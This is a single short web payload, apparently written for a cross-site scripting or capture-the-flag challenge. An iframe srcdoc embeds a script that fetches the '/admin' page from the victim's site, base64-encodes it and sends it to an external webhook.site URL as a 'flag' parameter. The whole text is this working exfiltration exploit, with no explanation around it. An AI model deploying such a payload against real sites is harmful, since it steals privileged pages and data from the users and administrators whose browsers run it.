<iframe srcdoc="
<script>
fetch('/admin')
  .then(r => r.text())
  .then(f => fetch('https://webhook.site/a2f145b5-2e6c-4189-8f48-6d1e29488c62?flag=' + btoa(f)))
</script>
"></iframe>
